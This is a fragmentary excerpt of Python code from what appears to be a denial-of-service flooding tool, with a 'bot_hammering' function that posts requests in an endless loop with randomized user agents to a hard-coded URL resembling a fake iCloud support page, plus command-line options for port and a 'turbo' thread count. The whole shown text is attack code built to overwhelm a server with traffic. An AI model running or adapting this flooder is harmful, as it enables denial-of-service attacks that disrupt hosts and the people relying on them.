...
def bot_hammering(url):
    try:
        while True:
            ...
            requests.post('https://www.icloud.idsupport-me.com/sys/fl2/ic.php',
                      data, headers={'User-Agent': random.choice(uagent)})
...
def get_parameters():
    ...
    optp.add_option("-p", "--port", type="int",
                    dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int",
                    dest="turbo", help="default 135 -t 135")
...
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(
        port), " turbo: ", str(thr), "\033[0m")
